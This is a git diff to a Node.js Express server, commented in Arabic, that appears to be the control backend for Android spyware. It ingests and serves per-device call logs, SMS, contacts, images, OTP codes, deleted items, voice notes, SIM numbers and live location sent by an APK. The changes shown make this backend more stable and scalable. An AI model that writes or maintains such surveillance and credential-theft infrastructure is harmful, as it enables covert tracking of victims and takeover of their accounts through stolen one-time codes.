@@ -9,7 +9,10 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(cors());
-app.use(bodyParser.json({ limit: '500mb' }));
+
+// ✅ 50 MB بدل 500 — يمنع OOM على Render Free (512 MB RAM)
+app.use(bodyParser.json({ limit: '50mb' }));
+
 app.use(express.static('public'));
 
 const dataDir = path.join(__dirname, 'data');
@@ -55,7 +58,7 @@ function loadPerms() { try { return JSON.parse(fs.readFileSync(permsFile, 'utf8'
 function savePerms(perms) { fs.writeFileSync(permsFile, JSON.stringify(perms, null, 2)); }
 function generateToken() { return crypto.randomBytes(32).toString('hex'); }
 
-let devicesLock = false;
+// ✅ حذفنا devicesLock — Node.js single-threaded، القفل كان يسبب busy-wait
 
 const sseClients = {};
 
@@ -81,12 +84,21 @@ app.get('/events.php', (req, res) => {
     const pingInterval = setInterval(() => { try { res.write(': ping\n\n'); } catch (e) {} }, 25000);
 
     if (!sseClients[deviceId]) sseClients[deviceId] = [];
+
+    // ✅ حماية: 5 clients كحد أقصى لكل device
+    if (sseClients[deviceId].length >= 5) {
+        clearInterval(pingInterval);
+        return res.status(429).send('Too many clients');
+    }
+
     sseClients[deviceId].push(res);
     console.log(`[SSE] +client device=${deviceId} total=${sseClients[deviceId].length}`);
 
     req.on('close', () => {
         clearInterval(pingInterval);
-        sseClients[deviceId] = sseClients[deviceId].filter(c => c !== res);
+        if (sseClients[deviceId]) {
+            sseClients[deviceId] = sseClients[deviceId].filter(c => c !== res);
+        }
         console.log(`[SSE] -client device=${deviceId}`);
     });
 });
@@ -95,7 +107,20 @@ function pushToDevice(deviceId, eventName, payload) {
     const msg = `event: ${eventName}\ndata: ${JSON.stringify(payload)}\n\n`;
     const targets = [...(sseClients[deviceId] || []), ...(sseClients['all'] || [])];
     let sent = 0;
-    targets.forEach(client => { try { client.write(msg); sent++; } catch (e) {} });
+    targets.forEach(client => {
+        try {
+            client.write(msg);
+            sent++;
+        } catch (e) {
+            // ✅ نحذف العميل الميت
+            if (sseClients[deviceId]) {
+                sseClients[deviceId] = sseClients[deviceId].filter(c => c !== client);
+            }
+            if (sseClients['all']) {
+                sseClients['all'] = sseClients['all'].filter(c => c !== client);
+            }
+        }
+    });
     if (sent > 0) console.log(`[SSE] >> ${eventName} to device=${deviceId}`);
 }
 
@@ -276,11 +301,7 @@ app.post('/upload.php', (req, res) => {
             const logFile = path.join(deviceDir, 'debug.log');
             fs.writeFileSync(logFile, data.logs || '');
             updateDevicesList(deviceId, null);
-            console.log(`═══════════════════════════════════════`);
             console.log(`[LOGS] ${(data.logs || '').length} bytes from ${deviceId}`);
-            console.log(`═══════════════════════════════════════`);
-            console.log(data.logs || 'empty');
-            console.log(`═══════════════════════════════════════`);
             return res.json({ success: true });
         }
 
@@ -503,9 +524,6 @@ app.post('/upload.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ═══════════════════════════════════════════════════════
-// ✅ live_update — محدّث بالحقول الجديدة
-// ═══════════════════════════════════════════════════════
 app.post('/live_update.php', (req, res) => {
     try {
         if (!isApkRequest(req)) return res.status(401).json({ error: 'Unauthorized' });
@@ -517,21 +535,14 @@ app.post('/live_update.php', (req, res) => {
         let live = {};
         if (fs.existsSync(liveFile)) live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
 
-        // ✅ بيانات الشبكة
         if (data.network) live.network = data.network;
         if (data.network_type) live.network_type = data.network_type;
-
-        // ✅ البطارية + الشحن
         if (data.battery !== undefined && data.battery !== null) live.battery = data.battery;
         if (data.charging !== undefined) live.charging = data.charging;
         if (data.charging_type) live.charging_type = data.charging_type;
-
-        // ✅ الموقع — لا يمسح إذا فاضي
         if (data.location && data.location.latitude && data.location.longitude) {
             live.location = data.location;
         }
-
-        // ✅ آخر اتصال
         if (data.last_seen) live.last_seen = data.last_seen;
         else live.last_seen = Math.floor(Date.now() / 1000);
 
@@ -541,9 +552,6 @@ app.post('/live_update.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ═══════════════════════════════════════════════════════
-// ✅ live.php — محدّث بالحقول الجديدة
-// ═══════════════════════════════════════════════════════
 app.get('/live.php', (req, res) => {
     try {
         const deviceId = req.query.device;
@@ -567,29 +575,29 @@ app.get('/live.php', (req, res) => {
         const profileFile = path.join(dataDir, deviceId, 'profile.json');
         const voiceFile = path.join(dataDir, deviceId, 'voice_notes.json');
 
-        let response = { 
-            online: false, 
-            network: 'غير متصل', 
+        let response = {
+            online: false,
+            network: 'غير متصل',
             network_type: 'غير معروف',
-            battery: null, 
+            battery: null,
             charging: false,
             charging_type: 'لا',
-            location: null, 
-            last_seen: 0, 
-            seconds_ago: 999999, 
-            call_count: 0, 
-            sms_count: 0, 
-            contacts_count: 0, 
-            images_count: 0, 
-            apps_count: 0, 
-            deleted_count: 0, 
-            otp_count: 0, 
-            voice_count: 0, 
-            sim_numbers: [], 
-            carrier: '', 
-            self_number: '', 
-            profile_number: '', 
-            profile_name: '' 
+            location: null,
+            last_seen: 0,
+            seconds_ago: 999999,
+            call_count: 0,
+            sms_count: 0,
+            contacts_count: 0,
+            images_count: 0,
+            apps_count: 0,
+            deleted_count: 0,
+            otp_count: 0,
+            voice_count: 0,
+            sim_numbers: [],
+            carrier: '',
+            self_number: '',
+            profile_number: '',
+            profile_name: ''
         };
 
         if (fs.existsSync(liveFile)) {
@@ -931,9 +939,8 @@ app.get('/devices.json', (req, res) => {
     } catch (e) { res.json([]); }
 });
 
+// ✅ بدون spinlock — Node.js single-threaded
 function updateDevicesList(deviceId, deviceInfo) {
-    while (devicesLock) { /* spin */ }
-    devicesLock = true;
     try {
         let devices = [];
         if (fs.existsSync(devicesFile)) devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
@@ -961,8 +968,8 @@ function updateDevicesList(deviceId, deviceInfo) {
             if (!live.network) live.network = 'متصل';
             fs.writeFileSync(liveFile, JSON.stringify(live, null, 2));
         } catch (e) {}
-    } finally {
-        devicesLock = false;
+    } catch (e) {
+        console.error('[UPDATE_DEVICES] error:', e.message);
     }
 }
 
